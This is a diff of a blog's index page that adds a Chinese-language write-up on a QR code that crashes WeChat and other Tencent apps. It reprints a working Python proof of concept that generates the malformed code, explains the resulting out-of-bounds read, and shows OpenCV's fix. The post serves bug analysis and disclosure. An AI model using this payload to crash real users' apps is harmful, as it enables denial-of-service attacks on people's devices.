@@ -229,6 +229,136 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://realvegechick.github.io/2023/04/25/%E8%85%BE%E8%AE%AF%E7%B3%BB%E6%89%AB%E7%A0%81%E5%B4%A9%E6%BA%83%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Vec's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2023/04/25/%E8%85%BE%E8%AE%AF%E7%B3%BB%E6%89%AB%E7%A0%81%E5%B4%A9%E6%BA%83%E6%BC%8F%E6%B4%9E/" itemprop="url">腾讯系扫码崩溃漏洞</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2023-04-25T02:07:13+00:00">
+                2023-04-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近在群里看见一张二维码，刚点开图片还没扫码，微信app就崩溃退出了。这引发了我浓厚的兴趣：崩溃退出多半是存在内存错误，如果能在二维码里编码特定的数据，产生可控的越界读写的话，说不定有利用价值。<br><img src="https://i.imgur.com/3q1prg0.jpg"></p>
+<h2 id="从微信入手"><a href="#从微信入手" class="headerlink" title="从微信入手"></a>从微信入手</h2><p>先看看微信的报错信息：<br><img src="https://i.imgur.com/tszCkI9.png"><br>非常清晰明了，是在libwechatQrMod.so中产生了一个对空指针的解引用造成的崩溃，并且还附上了出错的地址，可以直接在ida中定位相关代码：<br><img src="https://i.imgur.com/8hlBKRL.png"><br>正是这一句memcpy出了问题。但是native代码读起来太麻烦了，并且涉及大量数据格式的处理，没有符号表非常难读，于是转变思路。</p>
+<h2 id="其他的qrcode库"><a href="#其他的qrcode库" class="headerlink" title="其他的qrcode库"></a>其他的qrcode库</h2><p>已知微信识别不了，如果其他库也无法识别，很可能就是二维码库本身的问题。<br>我先后尝试了多个在线解析二维码的网站，也用python的zbar和opencv尝试识别，都无法从中读取任何信息。那么很可能这个漏洞就是格式解析错误导致的了，但是仅从二维码本身又看不出问题，事情陷入僵局。</p>
+<h2 id="开偷"><a href="#开偷" class="headerlink" title="开偷"></a>开偷</h2><p>不过就在这时，群里转了另一篇文章，里面附上了生成这种畸形二维码的代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import qrcode</span><br><span class="line">from qrcode.util import QRData, MODE_8BIT_BYTE</span><br><span class="line"></span><br><span class="line">NUM_BLOCKS = [19, 34, 55, 80, 108, 136, 156, 194, 232]</span><br><span class="line"></span><br><span class="line">def tencent_crash_qrcode(message: str, filename=&#x27;crash.png&#x27;):</span><br><span class="line"></span><br><span class="line">    def hack_put(self, num, length):</span><br><span class="line">        if num == 0:</span><br><span class="line">            num = 1</span><br><span class="line">        for i in range(length):</span><br><span class="line">            self.put_bit(((num &gt;&gt; (length - i - 1)) &amp; 1) == 1)</span><br><span class="line">    </span><br><span class="line">    data = message.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    data_len = len(data)</span><br><span class="line"></span><br><span class="line">    version = 1</span><br><span class="line">    while version &lt;= len(NUM_BLOCKS) and data_len + 3 &gt; NUM_BLOCKS[version-1]:</span><br><span class="line">        version += 1</span><br><span class="line">    if version &gt; len(NUM_BLOCKS):</span><br><span class="line">        raise Exception(&#x27;message too long&#x27;)</span><br><span class="line"></span><br><span class="line">    data += b&#x27; &#x27; * (NUM_BLOCKS[version-1] - data_len - 3)</span><br><span class="line"></span><br><span class="line">    print(data_len, version)</span><br><span class="line">    qr = qrcode.QRCode(version, qrcode.constants.ERROR_CORRECT_L)</span><br><span class="line">    </span><br><span class="line">    comm_data = QRData(data, MODE_8BIT_BYTE)</span><br><span class="line">    hack_data = QRData(b&#x27;&#x27;, MODE_8BIT_BYTE)</span><br><span class="line"></span><br><span class="line">    qr.add_data(comm_data, 0)</span><br><span class="line">    qr.add_data(hack_data, 0)</span><br><span class="line"></span><br><span class="line">    original_put = qrcode.util.BitBuffer.put</span><br><span class="line">    qrcode.util.BitBuffer.put = hack_put</span><br><span class="line">    qr.make_image().save(filename)</span><br><span class="line">    qrcode.util.BitBuffer.put = original_put</span><br><span class="line"></span><br><span class="line">tencent_crash_qrcode(&#x27;KFCVW50&#x27;)</span><br></pre></td></tr></table></figure>
+<p>可以看出，问题的关键在于代码在填满qrcode的数据区之后又添加了一个空的QRData，但是又重载了put方法使其长度被写为1，导致解析器认为后续还存在数据段，从而产生越界读。</p>
+<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>为了研究这一漏洞是否具有利用价值，我又去读了一下qrcode具体的编码过程。<br><img src="https://i.imgur.com/zi77Kjz.png"><br>数据与纠错码会以上图的顺序进行填充，加上掩码和版本信息。数据段后续具体存放的是什么数据依赖于具体的实现，但是并不能像设想的一样将自定义的数据写入任意地址，所以大概也没什么用。</p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>这篇文章刚写一半，就发现opencv已经把这个漏洞修了，出问题的代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-        count = (available + 7 / 8);</span><br><span class="line">+        count = (available + 7) / 8;</span><br><span class="line">    &#125;</span><br><span class="line">+   // avoid reading invalid memory region when no data should be processed</span><br><span class="line">+   if (count &lt;= 0) return;</span><br></pre></td></tr></table></figure>
+<p>非常明显的低级错误，可惜不是自己发现的。水平还有待提高。</p>
+<h2 id="参考材料"><a href="#参考材料" class="headerlink" title="参考材料"></a>参考材料</h2><p><a target="_blank" rel="noopener" href="https://t.me/TimeAxis/892">https://t.me/TimeAxis/892</a><br><a target="_blank" rel="noopener" href="https://nano.ac/posts/86257129/">https://nano.ac/posts/86257129/</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/85224424">https://zhuanlan.zhihu.com/p/85224424</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://realvegechick.github.io/2023/04/06/clash+adb%20reverse%E6%8A%93%E5%8C%85/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -956,7 +1086,7 @@
               
                 <a href="/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
